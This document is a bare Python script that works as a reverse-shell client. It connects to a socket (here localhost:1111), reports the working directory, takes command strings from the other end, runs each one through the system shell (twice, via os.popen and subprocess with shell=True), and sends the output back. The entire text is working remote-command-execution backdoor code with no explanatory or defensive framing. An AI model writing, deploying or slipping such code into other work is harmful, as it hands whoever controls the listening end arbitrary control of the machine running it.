import os, socket, subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 1111))
invalidsChars = ["é", "ç", "è", "à", "ù"]

while True:
	out1 = err1 =""
	a = os.getcwd()
	a = a.encode()
	s.send(a)
	cmd = s.recv(1024)
	cmd = cmd.decode()
	back = os.popen(cmd).read()
	back = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
	out, err = back.communicate()
	if out == b"" and err != b"":
		for element in err:
		    element = bytes([element])
		    try:
		        err1 += element.decode('utf-8')
		    except Exception as e:
		        err1 += "?"
		s.send(err1.encode())
	else:
		for element in out:
		    element = bytes([element])
		    try:
		        out1 += element.decode('utf-8')
		    except Exception as e:
		        out1 += "?"
		s.send(out1.encode())
		